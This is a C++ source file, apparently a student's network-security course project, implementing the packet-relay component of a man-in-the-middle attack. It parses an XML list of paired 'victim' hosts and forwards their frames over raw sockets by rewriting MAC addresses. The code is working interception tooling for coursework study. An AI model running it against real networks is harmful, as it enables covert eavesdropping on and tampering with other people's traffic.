/*
* Soubor:  Intercepter.cpp
* Datum:   2017/4/20
* Autor:   Bc. Lukas Pelanek, xpelan03@stud.fit.vutbr.cz
* Projekt: PDS, Man in the Middle
* Popis:   Aplikace pro preposilani provozu.
*/

#include "Intercepter.h"

// globalni promenne
int sck;

/* Signal handler */
void signalHandler(int signum) {
	exit(signum);
}

/* Hlavni program */
int main(int argc, char **argv) {
	// registrace signal handleru
	signal(SIGINT, signalHandler);

	int errCode;
	t_scannerParams params;

	// nacteni vstupnich parametru
	if ((errCode = IOHandler::getScannerParameters(argc, argv, &params)) != IOHandler::ERR_NO_ERROR) {
		IOHandler::printError(errCode);
		return -1;
	}

	// spusteni aplikace
	Intercepter program(params, &sck);
	if ((errCode = program.start()) != IOHandler::ERR_NO_ERROR) {
		IOHandler::printError(errCode);
		return 1;
	}
	return 0;
}

Intercepter::Intercepter(t_scannerParams params, int *socket) : _params(params) {
	_socket = socket;
}


 /* Vlozi par pro preposilani zprav */
int Intercepter::_addPair(I_node p1, I_node p2) {
	unsigned int x;
	struct in_addr ipv4;
	struct in6_addr ipv6;
	t_node node;

	// ziskani mac adresy obeti 1
	node.mac1[0] = std::stoul(p1.mac.substr(0, 2), nullptr, 16);
	node.mac1[1] = std::stoul(p1.mac.substr(2, 2), nullptr, 16);
	node.mac1[2] = std::stoul(p1.mac.substr(5, 2), nullptr, 16);
	node.mac1[3] = std::stoul(p1.mac.substr(7, 2), nullptr, 16);
	node.mac1[4] = std::stoul(p1.mac.substr(10, 2), nullptr, 16);
	node.mac1[5] = std::stoul(p1.mac.substr(12, 2), nullptr, 16);

	// ziskani mac adresy obeti 2
	node.mac2[0] = std::stoul(p2.mac.substr(0, 2), nullptr, 16);
	node.mac2[1] = std::stoul(p2.mac.substr(2, 2), nullptr, 16);
	node.mac2[2] = std::stoul(p2.mac.substr(5, 2), nullptr, 16);
	node.mac2[3] = std::stoul(p2.mac.substr(7, 2), nullptr, 16);
	node.mac2[4] = std::stoul(p2.mac.substr(10, 2), nullptr, 16);
	node.mac2[5] = std::stoul(p2.mac.substr(12, 2), nullptr, 16);

	// nevkladame pary, ktere zde jiz jsou
	for (x = 0; x < _pairs.size(); x++) {
		if ((std::memcmp(_pairs[x].mac1, node.mac1, 6) == 0 || std::memcmp(_pairs[x].mac1, node.mac2, 6) == 0) &&
			((std::memcmp(_pairs[x].mac2, node.mac1, 6) == 0 || std::memcmp(_pairs[x].mac2, node.mac2, 6) == 0))) {
			return 0;
		}
	}
	
	// vlozeni ipv4 adres obeti
	for (x = 0; x < p1.ipv4Addresses.size(); x++) {
		if ((inet_pton(AF_INET, p1.ipv4Addresses[x].c_str(), &ipv4)) != 1) {
			return IOHandler::ERR_NDP_SPOOF;
		}
		node.ipv4Addresses1.push_back(ipv4);
	}

	for (x = 0; x < p2.ipv4Addresses.size(); x++) {
		if ((inet_pton(AF_INET, p2.ipv4Addresses[x].c_str(), &ipv4)) != 1) {
			return IOHandler::ERR_NDP_SPOOF;
		}
		node.ipv4Addresses2.push_back(ipv4);
	}

	// vlozeni ipv6 adres obeti
	for (x = 0; x < p1.ipv6Addresses.size(); x++) {
		if ((inet_pton(AF_INET6, p1.ipv6Addresses[x].c_str(), &ipv6)) != 1) {
			return IOHandler::ERR_NDP_SPOOF;
		}
		node.ipv6Addresses1.push_back(ipv6);
	}

	for (x = 0; x < p2.ipv6Addresses.size(); x++) {
		if ((inet_pton(AF_INET6, p2.ipv6Addresses[x].c_str(), &ipv6)) != 1) {
			return IOHandler::ERR_NDP_SPOOF;
		}
		node.ipv6Addresses2.push_back(ipv6);
	}

	_pairs.push_back(node);

	return 0;
}

/* Odstrani mezery z retezce */
std::string Intercepter::_removeSpaces(std::string in) {
	in.erase(std::remove(in.begin(), in.end(), ' '), in.end());
	return in;
}

/* Prevede string na lower case */
std::string Intercepter::_toLower(std::string word) {
	std::transform(word.begin(), word.end(), word.begin(), ::tolower);
	return word;
}

/* nacte token */
std::string Intercepter::_readToken(std::string *inString) {
	std::size_t pos1;
	std::size_t pos2;
	std::string str;

	if ((pos1 = inString->find("<")) == std::string::npos) {
		return str;
	}
	if ((pos2 = inString->find(">")) == std::string::npos) {
		return str;
	}

	str = inString->substr(pos1, pos2 - pos1 + 1);
	
	*inString = inString->substr(pos2 + 1);

	return str;
}

int Intercepter::_init() {
	int errCode = 0;
	struct ifaddrs * ifAddrStruct = NULL;
	bool interfaceFound = false;
	struct ifaddrs * ifa = NULL;
	void * tmpAddrPtr = NULL;
	struct ifreq ifr;

	if ((errCode = _readInputXML()) != IOHandler::ERR_NO_ERROR) {
		return errCode;
	}

	getifaddrs(&ifAddrStruct);

	for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next) {
		if (!ifa->ifa_addr) {
			continue;
		}
		// ziskame ipv4 adresu a masku
		if (ifa->ifa_addr->sa_family == AF_INET && _params.interface == ifa->ifa_name) {
			_ipv4Addr = ((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
			_ipv4Mask = ((struct sockaddr_in *)ifa->ifa_netmask)->sin_addr;
			interfaceFound = true;
		}
		// ziskame ipv6 adresu a masku
		else if (ifa->ifa_addr->sa_family == AF_INET6 && _params.interface == ifa->ifa_name) {
			_ipv6Addr = ((struct sockaddr_in6 *)ifa->ifa_addr)->sin6_addr;
			_ipv6Mask = ((struct sockaddr_in6 *)ifa->ifa_netmask)->sin6_addr;
			interfaceFound = true;
		}
	}
	if (ifAddrStruct != NULL) {
		freeifaddrs(ifAddrStruct);
	}

	if (!interfaceFound) {
		return IOHandler::ERR_NO_IF_FOUND;
	}

	// otevreni socketu
	if ((*_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		return IOHandler::ERR_ARP_SEND;
	}

	// cteni mac adresy
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", _params.interface.c_str());
	if (ioctl(*_socket, SIOCGIFHWADDR, &ifr) < 0) {
		return IOHandler::ERR_ARP_SEND;
	}

	// kopirovani mac adresy
	memcpy(_macAddress, ifr.ifr_hwaddr.sa_data, 6);

	// konfigurace zarizeni 
	memset(&_dev, 0, sizeof(_dev));
	if ((_dev.sll_ifindex = if_nametoindex(_params.interface.c_str())) == 0) {
		close(*_socket);
		return IOHandler::ERR_ARP_SEND;
	}
	_dev.sll_family = AF_PACKET;
	_dev.sll_halen = 6;
	memcpy(_dev.sll_addr, _macAddress, 6);

	// otevreni socketu
	if ((*_socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
		return IOHandler::ERR_ARP_SEND;
	}

	return errCode;
}

int Intercepter::_intercept(uint8_t *packet) {
	unsigned int x;
	eth_hdr *eth_header;
	ipv4_header *ip4_header;
	struct ip6_hdr *ip6_header;

	eth_header = (eth_hdr *)packet;
	ip4_header = (ipv4_header *)(packet + 14);
	ip6_header = (struct ip6_hdr *)(packet + 14);

	// preposlani paketu ktery neni pro me
	for (x = 0; x < _pairs.size(); x++) {
		if (std::memcmp(_pairs[x].mac1, eth_header->source, 6) == 0) {
			if (eth_header->type == htons(0x0800) && _ipv4Addr.s_addr != ip4_header->ip_destaddr) {
				std::memcpy(eth_header->dest, _pairs[x].mac2, 6);
				if (sendto(*_socket, packet, ntohs(ip4_header->ip_total_length) + 14, 0, (struct sockaddr *) &_dev, sizeof(_dev)) < 0) {
					close(*_socket);
					return IOHandler::ERR_INTERCEPT;
				}
				return 0;
			}
			else if (eth_header->type == htons(0x086dd) && std::memcmp(ip6_header->ip6_dst.s6_addr, _ipv6Addr.s6_addr, 16) != 0) {
				std::memcpy(eth_header->dest, _pairs[x].mac2, 6);
				if (sendto(*_socket, packet, ntohs(ip6_header->ip6_plen) + 14 + sizeof(struct ip6_hdr), 0, (struct sockaddr *) &_dev, sizeof(_dev)) < 0) {
					close(*_socket);
					return IOHandler::ERR_INTERCEPT;
				}
			}
			return 0;
		}
		else if (std::memcmp(_pairs[x].mac2, eth_header->source, 6) == 0) {
			if (eth_header->type == htons(0x0800) && _ipv4Addr.s_addr != ip4_header->ip_destaddr) {
				std::memcpy(eth_header->dest, _pairs[x].mac1, 6);
				if (sendto(*_socket, packet, ntohs(ip4_header->ip_total_length) + 14, 0, (struct sockaddr *) &_dev, sizeof(_dev)) < 0) {
					close(*_socket);
					return IOHandler::ERR_INTERCEPT;
				}
				return 0;
			}
			else if (eth_header->type == htons(0x086dd) && std::memcmp(ip6_header->ip6_dst.s6_addr, _ipv6Addr.s6_addr, 16) != 0) {
				std::memcpy(eth_header->dest, _pairs[x].mac1, 6);
				if (sendto(*_socket, packet, ntohs(ip6_header->ip6_plen) + 14 + sizeof(struct ip6_hdr), 0, (struct sockaddr *) &_dev, sizeof(_dev)) < 0) {
					close(*_socket);
					return IOHandler::ERR_INTERCEPT;
				}
				return 0;
			}
			return 0;
		}
	}
	return 0;
}

/* Zkontroluje, zda vector obsahuje hledanou ipv6 adresu */
bool Intercepter::_checkIpv6Addr(std::vector<struct in6_addr> &ipv6Addresses, in6_addr &address) {
	unsigned int x;
	for (x = 0; x < ipv6Addresses.size(); x++) {
		if (std::memcmp(address.s6_addr, ipv6Addresses[x].s6_addr, 16) == 0) {
			return true;
		}
	}
	return false;
}


/* Zkontroluje, zda vector obsahuje hledanou ipv4 adresu */
bool Intercepter::_checkIpv4Addr(std::vector<struct in_addr> &ipv4Addresses, uint32_t &address) {
	unsigned int x;
	for (x = 0; x < ipv4Addresses.size(); x++) {
		if (address == ipv4Addresses[x].s_addr) {
			return true;
		}
	}
	return false;
}


int Intercepter::start() {
	uint8_t buffer[65535];
	int err = 0;

	if ((err = _init()) != IOHandler::ERR_NO_ERROR) {
		return err;
	}

	while (true) {
		if (recv(*_socket, buffer, IP_MAXPACKET, 0) > 0) {
			if ((err = _intercept(buffer)) != IOHandler::ERR_NO_ERROR) {
				return err;
			}
		}
	}

	return 0;
}

/* Cteni vstupniho XML formou lexikalniho analyzatoru */
int Intercepter::_readInputXML() {
	unsigned int x, y, z, counter;
	std::ifstream in(_params.file, std::ifstream::in);
	std::size_t position;
	std::string token;
	std::vector<I_node> inputNodes;
	I_node node;

	enum L_ERROR {
		L_START,
		L_END,
		L_HOST,
		L_ADDR,
		L_IPV4,
		L_IPV6,
		L_CHECK
	};

	if (!in.is_open()) {
		return IOHandler::ERR_IN_FILE;
	}

	// nacteni vstupu do stringu
	std::string xml((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());

	// zavri input
	in.close();

	L_ERROR state = L_START;
	std::string tmp;

	// prvni token s xml hlavickou preskocime
	if (_readToken(&xml).size() <= 0) {
		return IOHandler::ERR_IN_FILE;
	}

	while ((token = _readToken(&xml)).length() > 0 && (state != L_END)) {
		switch (state) {
		case L_START:
			if (_toLower(token) != "<devices>") {
				return IOHandler::ERR_IN_FILE;
			}
			state = L_HOST;
			break;
		case L_HOST:
			if ((_toLower(token).substr(0, 5) != "<host" || _toLower(token).find("mac=\"") == std::string::npos || _toLower(token).find("group=\"") == std::string::npos) && _toLower(token) != "</devices>") {
				return IOHandler::ERR_IN_FILE;
			}
			if (_toLower(token) == "</devices>") {
				state = L_END;
				break;
			}

			// ziskani mac adresy
			tmp = token.substr(_toLower(token).find("mac=\"") + 5);
			if ((position = tmp.find("\"")) == std::string::npos) {
				return IOHandler::ERR_IN_FILE;
			}
			tmp = tmp.substr(0, position);
			if (tmp.size() != 14) {
				return IOHandler::ERR_IN_FILE;
			}
			node.mac = _toLower(tmp);

			// ziskani skupiny
			tmp = token.substr(_toLower(token).find("group=\"") + 7);
			if ((position = tmp.find("\"")) == std::string::npos) {
				return IOHandler::ERR_IN_FILE;
			}
			tmp = tmp.substr(0, position);
			node.group = _toLower(tmp);

			state = L_ADDR;
			break;
		case L_ADDR:
			// nacteneho hosta vlozim do seznamu a vyprazdnim docasny uzel
			if (_toLower(token) == "</host>") {
				if (node.mac.length() > 0 && node.group.length() > 0 && (node.ipv4Addresses.size() > 0 || node.ipv6Addresses.size() > 0)) {
					inputNodes.push_back(node);
					node.mac.clear();
					node.group.clear();
					node.ipv4Addresses.clear();
					node.ipv6Addresses.clear();
				}
				state = L_HOST;
				break;
			}
			if (_toLower(token) != "<ipv4>" && _toLower(token) != "<ipv6>") {
				return IOHandler::ERR_IN_FILE;
			}

			if (_toLower(token) == "<ipv4>") {
				if ((position = xml.find("<")) == std::string::npos) {
					return IOHandler::ERR_IN_FILE;
				}
				tmp = _removeSpaces(xml.substr(0, position));
				node.ipv4Addresses.push_back(tmp);
			}
			else if (_toLower(token) == "<ipv6>") {
				if ((position = xml.find("<")) == std::string::npos) {
					return IOHandler::ERR_IN_FILE;
				}
				tmp = _removeSpaces(xml.substr(0, position));
				node.ipv6Addresses.push_back(tmp);
			}
			state = L_CHECK;
			break;
		case L_CHECK:
			if (_toLower(token) != "</ipv4>" && _toLower(token) != "</ipv6>") {
				return IOHandler::ERR_IN_FILE;
			}
			state = L_ADDR;
			break;
		default:
			break;
		}
	}
	if (state != L_END) {
		return IOHandler::ERR_IN_FILE;
	}

	// vlozeni paru
	for (x = 0; x < inputNodes.size(); x++) {
		counter = 0;
		for (y = x; y < inputNodes.size(); y++) {
			// nasli jsme par
			if (x != y && inputNodes[x].group == inputNodes[y].group) {
				++counter;
				if (counter > 1) {
					return IOHandler::ERR_IN_FILE;
				}
				_addPair(inputNodes[x], inputNodes[y]);
			}
		}
	}

	return 0;
}
